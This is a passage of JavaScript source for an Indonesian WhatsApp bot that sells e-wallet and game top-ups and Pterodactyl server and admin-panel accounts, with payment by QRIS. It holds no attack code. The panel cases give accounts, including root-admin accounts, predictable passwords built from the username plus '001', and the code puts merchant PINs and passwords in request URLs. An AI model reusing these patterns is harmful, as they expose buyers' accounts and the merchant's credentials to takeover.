      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: true
  },
})

    sock[m.sender] = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: get.data.result.idtransaksi,
      amount: get.data.result.jumlah.toString(),
      status: true,
      exp: setTimeout(async () => {
        if (sock[m.sender] && sock[m.sender].status) {
          await sock.sendMessage(sock[m.sender].chat, { text: "QRIS Pembayaran Telah Expired." }, { quoted: sock[m.sender].msg });
          await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key })
          delete sock[m.sender];
        }
      }, 250000)
    };
    

    while (sock[m.sender] && sock[m.sender].status && sock[m.sender].amount) {
      await sleep(5000);
      let resultcek = {}
      try {
      resultcek = await axios.get(
        `https://api-simplebot.vercel.app/orderkuota/cekstatus?apikey=${global.ApikeyRestApi}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`
      );
      } catch {}
      const req = resultcek?.data;

      if (sock[m.sender] && req?.result?.amount == sock[m.sender].amount) {
        sock[m.sender].status = false;
        clearTimeout(sock[m.sender].exp);

        await sock.sendMessage(sock[m.sender].chat, {
          text: `
*PEMBAYARAN BERHASIL ✅*

- ID: ${sock[m.sender].idDeposit}
- Total Pembayaran: Rp${await toRupiah(sock[m.sender].amount)}
- Barang: ${Obj.nama}
- Nomor Tujuan: ${Obj.nomor}
`,
        }, { quoted: sock[m.sender].msg });

        const idtrx = "sock" + `${Date.now()}`;
        await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.IdMerchant}&product=${Obj.kode}&dest=${Obj.nomor}&refID=${idtrx}&pin=${global.pinH2H}&password=${global.passwordH2H}`);
        await sleep(6000);
        let dt = await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.IdMerchant}&product=${Obj.kode}&dest=${Obj.nomor}&refID=${idtrx}&pin=${global.pinH2H}&password=${global.passwordH2H}`);
        if (/status Sukses/.test(dt)) {
          await sock.sendMessage(sock[m.sender].chat, { text: dt, contextInfo: { isForwarded: true } }, { quoted: null });
        } else {
          await sock.sendMessage(sock[m.sender].chat, { text: dt, contextInfo: { isForwarded: true } }, { quoted: null });
          await sock.sendMessage(sock[m.sender].chat, { text: `Terjadi kesalahan saat melakukan transaksi

Hubungi ownerbot
- https://wa.me/${global.owner}`, contextInfo: { isForwarded: true } }, { quoted: null });
        }
        
        await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key });

        delete sock[m.sender];
      }
    }
  } catch (err) {
    console.error("Terjadi kesalahan:", err);
    reply("Terjadi kesalahan saat memproses pembayaran.");
 }
 }
break

//=============================================//

case "topupgopay": {
  if (m.isGroup) return reply(mess.private)
  if (sock[m.sender]) return reply(`Masih ada transaksi yang belum diselesaikan.\nketik *.batalbeli* untuk membatalkan transaksi sebelumnya`);
if (!text) return reply(`Masukan nomor gopay\n*contoh:* ${cmd} 0838XXX`)
  if (!text.includes("|")) {
  const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
      let dana = data.filter(item => /GOPAY/i.test(item.keterangan) && /DOMPET DIGITAL/i.test(item.kategori) && item.harga > 0);
    let sections = []
    for (let item of dana) {
    sections.push({
    title: item.keterangan, 
    description: `Rp${await toRupiah(item.harga)}`, 
    id: `.topupgopay ${text.replace(/[^0-9]/g, "").trim()}|${item.harga}|${item.kode}|${item.keterangan}`
    })
    }
    return sock.sendMessage(
  m.chat,
  {
    buttons: [
      {
        buttonId: "action",
        buttonText: { displayText: "ini pesan interactiveMeta" },
        type: 4,
        nativeFlowInfo: {
          name: "single_select",
          paramsJson: JSON.stringify({
            title: "Pilih Jumlah",
            sections: [
              {
                rows: sections, 
              },
            ],
          }),
        },
      },
    ],
    headerType: 1,
    viewOnce: true,
    text: "\nPilih Jumlah Topup Gopay\n",
    contextInfo: {
      isForwarded: true,
      mentionedJid: [m.sender],
    },
  },
  { quoted: null }
);
  }

  let Obj = {};
  Obj.nomor = text.split("|")[0]
  Obj.harga = text.split("|")[1]
  Obj.nama = text.split("|")[3]
  Obj.kode = text.split("|")[2]
  
  const amount = Number(Obj.harga) + generateRandomNumber(110, 250);

  try {
    const get = await axios.get(
      `https://api-simplebot.vercel.app/orderkuota/createpayment?apikey=${global.ApikeyRestApi}&amount=${amount}&codeqr=${global.QrisOrderKuota}`
    );

    const teks3 = `
*INFORMASI PEMBAYARAN*
  
- ID: ${get.data.result.idtransaksi}
- Total Pembayaran: Rp${await toRupiah(get.data.result.jumlah)}
- Barang: ${Obj.nama}
- Nomor Tujuan: ${Obj.nomor}
- Expired Payment: 5 menit

*Penting :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid.
`

    let msgQr = await sock.sendMessage(m.chat, {
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: true
  },
})

    sock[m.sender] = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: get.data.result.idtransaksi,
      amount: get.data.result.jumlah.toString(),
      status: true,
      exp: setTimeout(async () => {
        if (sock[m.sender] && sock[m.sender].status) {
          await sock.sendMessage(sock[m.sender].chat, { text: "QRIS Pembayaran Telah Expired." }, { quoted: sock[m.sender].msg });
          await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key })
          delete sock[m.sender];
        }
      }, 250000)
    };
    

    while (sock[m.sender] && sock[m.sender].status && sock[m.sender].amount) {
      await sleep(5000);
      let resultcek = {}
      try {
      resultcek = await axios.get(
        `https://api-simplebot.vercel.app/orderkuota/cekstatus?apikey=${global.ApikeyRestApi}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`
      );
      } catch {}
      const req = resultcek?.data;

      if (sock[m.sender] && req?.result?.amount == sock[m.sender].amount) {
        sock[m.sender].status = false;
        clearTimeout(sock[m.sender].exp);

        await sock.sendMessage(sock[m.sender].chat, {
          text: `
*PEMBAYARAN BERHASIL ✅*

- ID: ${sock[m.sender].idDeposit}
- Total Pembayaran: Rp${await toRupiah(sock[m.sender].amount)}
- Barang: ${Obj.nama}
- Nomor Tujuan: ${Obj.nomor}
`,
        }, { quoted: sock[m.sender].msg });

        const idtrx = "sock" + `${Date.now()}`;
        await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.IdMerchant}&product=${Obj.kode}&dest=${Obj.nomor}&refID=${idtrx}&pin=${global.pinH2H}&password=${global.passwordH2H}`);
        await sleep(6000);
        let dt = await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.IdMerchant}&product=${Obj.kode}&dest=${Obj.nomor}&refID=${idtrx}&pin=${global.pinH2H}&password=${global.passwordH2H}`);
        if (/status Sukses/.test(dt)) {
          await sock.sendMessage(sock[m.sender].chat, { text: dt, contextInfo: { isForwarded: true } }, { quoted: null });
        } else {
          await sock.sendMessage(sock[m.sender].chat, { text: dt, contextInfo: { isForwarded: true } }, { quoted: null });
          await sock.sendMessage(sock[m.sender].chat, { text: `Terjadi kesalahan saat melakukan transaksi

Hubungi ownerbot
- https://wa.me/${global.owner}`, contextInfo: { isForwarded: true } }, { quoted: null });
        }
        
        await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key });

        delete sock[m.sender];
      }
    }
  } catch (err) {
    console.error("Terjadi kesalahan:", err);
    reply("Terjadi kesalahan saat memproses pembayaran.");
 }
 }
break

//=============================================//

case "topupml": {
  if (m.isGroup) return reply(mess.private)
  if (sock[m.sender]) return reply(`Masih ada transaksi yang belum diselesaikan.\nketik *.batalbeli* untuk membatalkan transaksi sebelumnya`);
if (!text || !text.includes("|")) return reply(`Masukan id & server\n*contoh:* ${cmd} id|server`)
  if (text.split("|").length < 4) {
  const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
      let dana = data.filter(item => /Diamond Mobile Legend/i.test(item.keterangan) && item.harga > 0);
    let sections = []
    for (let item of dana) {
    sections.push({
    title: item.keterangan, 
    description: `Rp${await toRupiah(item.harga)}`, 
    id: `.topupml ${text.replace(/[^0-9]/g, "").trim()}|${item.harga}|${item.kode}|${item.keterangan}`
    })
    }
    return sock.sendMessage(
  m.chat,
  {
    buttons: [
      {
        buttonId: "action",
        buttonText: { displayText: "ini pesan interactiveMeta" },
        type: 4,
        nativeFlowInfo: {
          name: "single_select",
          paramsJson: JSON.stringify({
            title: "Pilih Jumlah",
            sections: [
              {
                rows: sections, 
              },
            ],
          }),
        },
      },
    ],
    headerType: 1,
    viewOnce: true,
    text: "\nPilih Jumlah Diamond Mobile Legends\n",
    contextInfo: {
      isForwarded: true,
      mentionedJid: [m.sender],
    },
  },
  { quoted: null }
);
  }

  let Obj = {};
  Obj.nomor = text.split("|")[0]
  Obj.harga = text.split("|")[1]
  Obj.nama = text.split("|")[3]
  Obj.kode = text.split("|")[2]
  
  const amount = Number(Obj.harga) + generateRandomNumber(110, 250);

  try {
    const get = await axios.get(
      `https://api-simplebot.vercel.app/orderkuota/createpayment?apikey=${global.ApikeyRestApi}&amount=${amount}&codeqr=${global.QrisOrderKuota}`
    );

    const teks3 = `
*INFORMASI PEMBAYARAN*
  
- ID: ${get.data.result.idtransaksi}
- Total Pembayaran: Rp${await toRupiah(get.data.result.jumlah)}
- Barang: ${Obj.nama}
- ID Game: ${Obj.nomor}
- Expired Payment: 5 menit

*Penting :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid.
`

    let msgQr = await sock.sendMessage(m.chat, {
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: true
  },
})

    sock[m.sender] = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: get.data.result.idtransaksi,
      amount: get.data.result.jumlah.toString(),
      status: true,
      exp: setTimeout(async () => {
        if (sock[m.sender] && sock[m.sender].status) {
          await sock.sendMessage(sock[m.sender].chat, { text: "QRIS Pembayaran Telah Expired." }, { quoted: sock[m.sender].msg });
          await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key })
          delete sock[m.sender];
        }
      }, 250000)
    };
    

    while (sock[m.sender] && sock[m.sender].status && sock[m.sender].amount) {
      await sleep(5000);
      let resultcek = {}
      try {
      resultcek = await axios.get(
        `https://api-simplebot.vercel.app/orderkuota/cekstatus?apikey=${global.ApikeyRestApi}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`
      );
      } catch {}
      const req = resultcek?.data;

      if (sock[m.sender] && req?.result?.amount == sock[m.sender].amount) {
        sock[m.sender].status = false;
        clearTimeout(sock[m.sender].exp);

        await sock.sendMessage(sock[m.sender].chat, {
          text: `
*PEMBAYARAN BERHASIL ✅*

- ID: ${sock[m.sender].idDeposit}
- Total Pembayaran: Rp${await toRupiah(sock[m.sender].amount)}
- Barang: ${Obj.nama}
- ID Game: ${Obj.nomor}
`,
        }, { quoted: sock[m.sender].msg });

        const idtrx = "sock" + `${Date.now()}`;
        await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.IdMerchant}&product=${Obj.kode}&dest=${Obj.nomor}&refID=${idtrx}&pin=${global.pinH2H}&password=${global.passwordH2H}`);
        await sleep(6000);
        let dt = await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.IdMerchant}&product=${Obj.kode}&dest=${Obj.nomor}&refID=${idtrx}&pin=${global.pinH2H}&password=${global.passwordH2H}`);
        if (/status Sukses/.test(dt)) {
          await sock.sendMessage(sock[m.sender].chat, { text: dt, contextInfo: { isForwarded: true } }, { quoted: null });
        } else {
          await sock.sendMessage(sock[m.sender].chat, { text: dt, contextInfo: { isForwarded: true } }, { quoted: null });
          await sock.sendMessage(sock[m.sender].chat, { text: `Terjadi kesalahan saat melakukan transaksi

Hubungi ownerbot
- https://wa.me/${global.owner}`, contextInfo: { isForwarded: true } }, { quoted: null });
        }
        
        await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key });

        delete sock[m.sender];
      }
    }
  } catch (err) {
    console.error("Terjadi kesalahan:", err);
    reply("Terjadi kesalahan saat memproses pembayaran.");
 }
 }
break

//=============================================//

case "topupff": {
  if (m.isGroup) return reply(mess.private)
  if (sock[m.sender]) return reply(`Masih ada transaksi yang belum diselesaikan.\nketik *.batalbeli* untuk membatalkan transaksi sebelumnya`);
if (!text) return reply(`Masukan id akun\n*contoh:* ${cmd} idakun`)
  if (text.split("|").length < 4) {
  const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
      let dana = data.filter(item => /Diamond Free Fire/i.test(item.keterangan) && item.harga > 0);
    let sections = []
    for (let item of dana) {
    sections.push({
    title: item.keterangan, 
    description: `Rp${await toRupiah(item.harga)}`, 
    id: `.topupff ${text.replace(/[^0-9]/g, "").trim()}|${item.harga}|${item.kode}|${item.keterangan}`
    })
    }
    return sock.sendMessage(
  m.chat,
  {
    buttons: [
      {
        buttonId: "action",
        buttonText: { displayText: "ini pesan interactiveMeta" },
        type: 4,
        nativeFlowInfo: {
          name: "single_select",
          paramsJson: JSON.stringify({
            title: "Pilih Jumlah",
            sections: [
              {
                rows: sections, 
              },
            ],
          }),
        },
      },
    ],
    headerType: 1,
    viewOnce: true,
    text: "\nPilih Jumlah Diamond Free Fire\n",
    contextInfo: {
      isForwarded: true,
      mentionedJid: [m.sender],
    },
  },
  { quoted: null }
);
  }

  let Obj = {};
  Obj.nomor = text.split("|")[0]
  Obj.harga = text.split("|")[1]
  Obj.nama = text.split("|")[3]
  Obj.kode = text.split("|")[2]
  
  const amount = Number(Obj.harga) + generateRandomNumber(110, 250);

  try {
    const get = await axios.get(
      `https://api-simplebot.vercel.app/orderkuota/createpayment?apikey=${global.ApikeyRestApi}&amount=${amount}&codeqr=${global.QrisOrderKuota}`
    );

    const teks3 = `
*INFORMASI PEMBAYARAN*
  
- ID: ${get.data.result.idtransaksi}
- Total Pembayaran: Rp${await toRupiah(get.data.result.jumlah)}
- Barang: ${Obj.nama}
- ID Akun: ${Obj.nomor}
- Expired Payment: 5 menit

*Penting :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid.
`

    let msgQr = await sock.sendMessage(m.chat, {
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: true
  },
})

    sock[m.sender] = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: get.data.result.idtransaksi,
      amount: get.data.result.jumlah.toString(),
      status: true,
      exp: setTimeout(async () => {
        if (sock[m.sender] && sock[m.sender].status) {
          await sock.sendMessage(sock[m.sender].chat, { text: "QRIS Pembayaran Telah Expired." }, { quoted: sock[m.sender].msg });
          await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key })
          delete sock[m.sender];
        }
      }, 250000)
    };
    

    while (sock[m.sender] && sock[m.sender].status && sock[m.sender].amount) {
      await sleep(5000);
      let resultcek = {}
      try {
      resultcek = await axios.get(
        `https://api-simplebot.vercel.app/orderkuota/cekstatus?apikey=${global.ApikeyRestApi}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`
      );
      } catch {}
      const req = resultcek?.data;

      if (sock[m.sender] && req?.result?.amount == sock[m.sender].amount) {
        sock[m.sender].status = false;
        clearTimeout(sock[m.sender].exp);

        await sock.sendMessage(sock[m.sender].chat, {
          text: `
*PEMBAYARAN BERHASIL ✅*

- ID: ${sock[m.sender].idDeposit}
- Total Pembayaran: Rp${await toRupiah(sock[m.sender].amount)}
- Barang: ${Obj.nama}
- ID Akun: ${Obj.nomor}
`,
        }, { quoted: sock[m.sender].msg });

        const idtrx = "sock" + `${Date.now()}`;
        await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.IdMerchant}&product=${Obj.kode}&dest=${Obj.nomor}&refID=${idtrx}&pin=${global.pinH2H}&password=${global.passwordH2H}`);
        await sleep(6000);
        let dt = await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.IdMerchant}&product=${Obj.kode}&dest=${Obj.nomor}&refID=${idtrx}&pin=${global.pinH2H}&password=${global.passwordH2H}`);
        if (/status Sukses/.test(dt)) {
          await sock.sendMessage(sock[m.sender].chat, { text: dt, contextInfo: { isForwarded: true } }, { quoted: null });
        } else {
          await sock.sendMessage(sock[m.sender].chat, { text: dt, contextInfo: { isForwarded: true } }, { quoted: null });
          await sock.sendMessage(sock[m.sender].chat, { text: `Terjadi kesalahan saat melakukan transaksi

Hubungi ownerbot
- https://wa.me/${global.owner}`, contextInfo: { isForwarded: true } }, { quoted: null });
        }
        
        await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key });

        delete sock[m.sender];
      }
    }
  } catch (err) {
    console.error("Terjadi kesalahan:", err);
    reply("Terjadi kesalahan saat memproses pembayaran.");
 }
 }
break

//=============================================//

case "belipanel": case "buypanel": {
  if (m.isGroup) return reply(mess.private)
  if (sock[m.sender]) return reply(`Masih ada transaksi yang belum diselesaikan.\nketik *.batalbeli* untuk membatalkan transaksi sebelumnya`);
if (!text) return reply(`Masukan username\n*contoh:* ${cmd} skyzopedia`)
if (args.length > 1) return reply("Username dilarang menggunakan spasi.")
  if (!text.includes("|")) {
    let usn = text.toLowerCase()
    return sock.sendMessage(
  m.chat,
  {
    buttons: [
      {
        buttonId: "action",
        buttonText: { displayText: "ini pesan interactiveMeta" },
        type: 4,
        nativeFlowInfo: {
          name: "single_select",
          paramsJson: JSON.stringify({
            title: "Pilih Ram Server",
            sections: [
              {
                highlight_label: "Hight Quality",
                rows: [
                  { title: "Ram ∞ || Cpu ∞ || Disk ∞", description: "Rp11.000", id: `.buypanel unlimited|${usn}` },
                  { title: "Ram 1GB || Cpu 40% || Disk 1GB", description: "Rp1000", id: `.buypanel 1gb|${usn}` },
                  { title: "Ram 2GB || Cpu 60% || Disk 1GB", description: "Rp2000", id: `.buypanel 2gb|${usn}` },
                  { title: "Ram 3GB || Cpu 80% || Disk 2GB", description: "Rp3000", id: `.buypanel 3gb|${usn}` },
                  { title: "Ram 4GB || Cpu 100% || Disk 2GB", description: "Rp4000", id: `.buypanel 4gb|${usn}` },
                  { title: "Ram 5GB || Cpu 120% || Disk 3GB", description: "Rp5000", id: `.buypanel 5gb|${usn}` },
                  { title: "Ram 6GB || Cpu 140% || Disk 3GB", description: "Rp6000", id: `.buypanel 6gb|${usn}` },
                  { title: "Ram 7GB || Cpu 160% || Disk 4GB", description: "Rp7000", id: `.buypanel 7gb|${usn}` },
                  { title: "Ram 8GB || Cpu 180% || Disk 4GB", description: "Rp8000", id: `.buypanel 8gb|${usn}` },
                  { title: "Ram 9GB || Cpu 200% || Disk 5GB", description: "Rp9000", id: `.buypanel 9gb|${usn}` },
                  { title: "Ram 10GB || Cpu 220% || Disk 5GB", description: "Rp10.000", id: `.buypanel 10gb|${usn}` },
                ],
              },
            ],
          }),
        },
      },
    ],
    headerType: 1,
    viewOnce: true,
    text: "\nPilih Ram Server Panel\n",
    contextInfo: {
      isForwarded: true,
      mentionedJid: [m.sender],
    },
  },
  { quoted: null }
);
  }

  let Obj = {};
  let cmds = text.split("|")[0].toLowerCase()
  const ramOptions = {
    "1gb": { ram: "1000", disk: "1000", cpu: "40", harga: "1000" },
    "2gb": { ram: "2000", disk: "1000", cpu: "60", harga: "2000" },
    "3gb": { ram: "3000", disk: "2000", cpu: "80", harga: "3000" },
    "4gb": { ram: "4000", disk: "2000", cpu: "100", harga: "4000" },
    "5gb": { ram: "5000", disk: "3000", cpu: "120", harga: "5000" },
    "6gb": { ram: "6000", disk: "3000", cpu: "140", harga: "6000" },
    "7gb": { ram: "7000", disk: "4000", cpu: "160", harga: "7000" },
    "8gb": { ram: "8000", disk: "4000", cpu: "180", harga: "8000" },
    "9gb": { ram: "9000", disk: "5000", cpu: "200", harga: "9000" },
    "10gb": { ram: "10000", disk: "5000", cpu: "220", harga: "10000" },
    "unli": { ram: "0", disk: "0", cpu: "0", harga: "11000" },
    "unlimited": { ram: "0", disk: "0", cpu: "0", harga: "11000" },
  };

  if (!ramOptions[cmds]) return m.reply("Pilihan RAM tidak valid!");
  dts = ramOptions[cmds];
  Obj.username = text.split("|")[1]
  Obj.harga = dts.harga
  Obj.ram = dts.ram
  Obj.disk = dts.disk
  Obj.cpu = dts.cpu
  
  const amount = Number(Obj.harga) + generateRandomNumber(110, 250);

  try {
    const get = await axios.get(
      `https://api-simplebot.vercel.app/orderkuota/createpayment?apikey=${global.ApikeyRestApi}&amount=${amount}&codeqr=${global.QrisOrderKuota}`
    );

    const teks3 = `
*INFORMASI PEMBAYARAN*
  
- ID: ${get.data.result.idtransaksi}
- Total Pembayaran: Rp${await toRupiah(get.data.result.jumlah)}
- Barang: Panel Pterodactyl
- Expired Payment: 5 menit

*Penting :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid.
`

    let msgQr = await sock.sendMessage(m.chat, {
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: true
  },
})

    sock[m.sender] = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: get.data.result.idtransaksi,
      amount: get.data.result.jumlah.toString(),
      status: true,
      exp: setTimeout(async () => {
        if (sock[m.sender] && sock[m.sender].status) {
          await sock.sendMessage(sock[m.sender].chat, { text: "QRIS Pembayaran Telah Expired." }, { quoted: sock[m.sender].msg });
          await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key })
          delete sock[m.sender];
        }
      }, 250000)
    };
    

    while (sock[m.sender] && sock[m.sender].status && sock[m.sender].amount) {
      await sleep(5000);
      let resultcek = {}
      try {
      resultcek = await axios.get(
        `https://api-simplebot.vercel.app/orderkuota/cekstatus?apikey=${global.ApikeyRestApi}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`
      );
      } catch {}
      const req = resultcek?.data;

      if (sock[m.sender] && req?.result?.amount == sock[m.sender].amount) {
        sock[m.sender].status = false;
        clearTimeout(sock[m.sender].exp);

        await sock.sendMessage(sock[m.sender].chat, {
          text: `
*PEMBAYARAN BERHASIL ✅*

- ID: ${sock[m.sender].idDeposit}
- Total Pembayaran: Rp${await toRupiah(sock[m.sender].amount)}
- Barang: Panel Pterodactyl
`,
        }, { quoted: sock[m.sender].msg });

        let username = Obj.username
        let email = username + "@gmail.com";
        let name = capital(username) + " Server";
        let password = username + "001"
        let f = await fetch(domain + "/api/application/users", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + apikey,
          },
          body: JSON.stringify({
            email: email,
            username: username.toLowerCase(),
            first_name: name,
            last_name: "Server",
            language: "en",
            password: password.toString(),
          }),
        });
        let data = await f.json();
        if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
        let user = data.attributes;
        let desc = tanggal(Date.now());
        let usr_id = user.id;
        let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
          method: "GET",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + apikey,
          },
        });
        let data2 = await f1.json();
        let startup_cmd = data2.attributes.startup;
        let f2 = await fetch(domain + "/api/application/servers", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + apikey,
          },
          body: JSON.stringify({
            name: name,
            description: desc,
            user: usr_id,
            egg: parseInt(egg),
            docker_image: "ghcr.io/parkervcp/yolks:nodejs_20",
            startup: startup_cmd,
            environment: {
              INST: "npm",
              USER_UPLOAD: "0",
              AUTO_UPDATE: "0",
              CMD_RUN: "npm start",
            },
            limits: {
              memory: Obj.ram,
              swap: 0,
              disk: Obj.disk,
              io: 500,
              cpu: Obj.cpu,
            },
            feature_limits: {
              databases: 5,
              backups: 5,
              allocations: 5,
            },
            deploy: {
              locations: [parseInt(loc)],
              dedicated_ip: false,
              port_range: [],
            },
          }),
        });
        let result = await f2.json();
        if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2));
        let server = result.attributes;
        var orang = sock[m.sender].chat;
let tekspanel = `
*Berikut detail akun panel kamu*

📡 Server ID: ${server.id}
👤 Username: \`${user.username}\`
🔐 Password: \`${password}\`
🗓️ Tanggal Aktivasi: ${global.tanggal(Date.now())}

*⚙️ Spesifikasi server panel*
- RAM: ${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0, 2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}
- DISK: ${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0, 2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}
- CPU: ${Obj.cpu == "0" ? "Unlimited" : Obj.cpu + "%"}
- ${global.domain}

*Rules pembelian panel :*  
- Masa aktif 30 hari  
- Data bersifat pribadi, mohon disimpan dengan aman  
- Garansi berlaku 15 hari (1x replace)  
- Klaim garansi wajib menyertakan *bukti chat pembelian*
`

        await sock.sendMessage(
          orang,
          {
            text: tekspanel,
            contextInfo: {
            isForwarded: true
            }
          },
          { quoted: null }
        );
        await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key });

        delete sock[m.sender];
      }
    }
  } catch (err) {
    console.error("Terjadi kesalahan:", err);
    reply("Terjadi kesalahan saat memproses pembayaran.");
 }
 }
break

//=============================================//

case "beliadp": case "buyadp": case "buyadminpanel": {
  if (m.isGroup) return reply(mess.private)
  if (sock[m.sender]) return reply(`Masih ada transaksi yang belum diselesaikan.\nketik *.batalbeli* untuk membatalkan transaksi sebelumnya`);
if (!text) return reply(`Masukan username\n*contoh:* ${cmd} skyzopedia`)
if (args.length > 1) return reply("Username dilarang menggunakan spasi.")
  let Obj = {}
  Obj.harga = 20000
  Obj.username = text.toLowerCase()

  const amount = Number(Obj.harga) + generateRandomNumber(110, 250);

  try {
    const get = await axios.get(
      `https://api-simplebot.vercel.app/orderkuota/createpayment?apikey=${global.ApikeyRestApi}&amount=${amount}&codeqr=${global.QrisOrderKuota}`
    );

    const teks3 = `
*INFORMASI PEMBAYARAN*
  
- ID: ${get.data.result.idtransaksi}
- Total Pembayaran: Rp${await toRupiah(get.data.result.jumlah)}
- Barang: Admin Panel Pterodactyl
- Expired Payment: 5 menit

*Penting :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid.
`

    let msgQr = await sock.sendMessage(m.chat, {
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: true
  },
})

    sock[m.sender] = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: get.data.result.idtransaksi,
      amount: get.data.result.jumlah.toString(),
      status: true,
      exp: setTimeout(async () => {
        if (sock[m.sender] && sock[m.sender].status) {
          await sock.sendMessage(sock[m.sender].chat, { text: "QRIS Pembayaran Telah Expired." }, { quoted: sock[m.sender].msg });
          await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key })
          delete sock[m.sender];
        }
      }, 250000)
    };
    

    while (sock[m.sender] && sock[m.sender].status && sock[m.sender].amount) {
      await sleep(5000);
      const resultcek = await axios.get(
        `https://api-simplebot.vercel.app/orderkuota/cekstatus?apikey=${global.ApikeyRestApi}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`
      ).catch(_ => {})
      const req = resultcek?.data;

      if (sock[m.sender] && req?.result?.amount == sock[m.sender].amount) {
        sock[m.sender].status = false;
        clearTimeout(sock[m.sender].exp);

        await sock.sendMessage(sock[m.sender].chat, {
          text: `
*PEMBAYARAN BERHASIL ✅*

- ID: ${sock[m.sender].idDeposit}
- Total Pembayaran: Rp${await toRupiah(sock[m.sender].amount)}
- Barang: Admin Panel Pterodactyl
`,
        }, { quoted: sock[m.sender].msg });
let username = Obj.username
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+"001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang = sock[m.sender].chat
var teks = `
*Berikut Detail Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
*🗓️ ${tanggal(Date.now())}*

*🌐* ${global.domain}

